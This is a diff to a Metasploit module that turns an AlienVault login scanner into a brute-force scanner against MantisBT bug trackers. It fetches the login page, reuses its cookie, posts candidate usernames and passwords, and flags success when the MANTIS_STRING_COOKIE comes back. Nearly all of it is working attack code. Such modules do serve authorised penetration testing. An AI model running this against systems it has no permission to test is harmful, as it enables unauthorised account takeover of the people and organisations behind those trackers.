@@ -10,14 +10,14 @@ require 'metasploit/framework/login_scanner/http'
 module Metasploit
   module Framework
     module LoginScanner
-      class AlienVault < ::Metasploit::Framework::LoginScanner::HTTP
+      class MantisBT < ::Metasploit::Framework::LoginScanner::HTTP
         def attempt_login(credential)
           result_opts = {
             credential: credential,
             host: host,
             port: port,
             protocol: 'tcp',
-            #service_name: 'http'
+            service_name: 'http'
           }
 
           begin
@@ -26,24 +26,33 @@ module Metasploit
             cli.connect
 
             req = cli.request_cgi({
-              'method' => 'POST',
-              'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php'),
-              'vars_post' => {
-                'embed' => '',
-                'bookmark_string' => '',
-                'user' => credential.public,
-                'passu' => credential.private,
-                'pass' => Rex::Text.encode_base64(credential.private)
-              }
+              'uri' => uri + '/login_page.php'
             })
 
             res = cli.send_recv(req)
 
-            if res && res.code == 302
-              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res)
+            cookie = res.get_cookies
+
+            req = cli.request_cgi({
+              'method' => 'POST',
+              'uri' => uri + '/login.php',
+              'vars_post' => {
+                'return' => 'index.php',
+                'username' => credential.public,
+                'password' => credential.private,
+                'secure_session' => 'on'
+              },
+              'cookie' => cookie
+            })
+
+            res = cli.send_recv(req)
+
+            if res && res.get_cookies =~ /MANTIS_STRING_COOKIE/
+              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
             else
               result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
             end
+
           rescue Exception => e
             result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
           end
@@ -65,23 +74,20 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-        'Name'           => 'AlienVault Login Scanner',
+        'Name'           => 'MantisBT Credential Bruteforce',
         'Description'    => %q(
-        This modules attempts to bruteforce credentials on an
-        AlienVault instance.
+        This module attempts to bruteforce credentials for a MantisBT bug tracking system.
       ),
         'Author'         =>
           [
-            'ExploitHub'
           ],
         'License'        => 'ExploitHub',
         'References'     =>
           [
           ],
         'DefaultOptions' => {
-            'RPORT'           => 443,
-            'STOP_ON_SUCCESS' => true,
-            'SSL' => true
+            'RPORT'           => 80,
+            'STOP_ON_SUCCESS' => true
         }
     )
   end
@@ -97,7 +103,7 @@ class MetasploitModule < Msf::Auxiliary
       user_as_pass: datastore['USER_AS_PASS']
     )
 
-    scanner = Metasploit::Framework::LoginScanner::AlienVault.new(
+    scanner = Metasploit::Framework::LoginScanner::MantisBT.new(
       configure_http_login_scanner(
         host: ip,
         port: datastore['RPORT'],
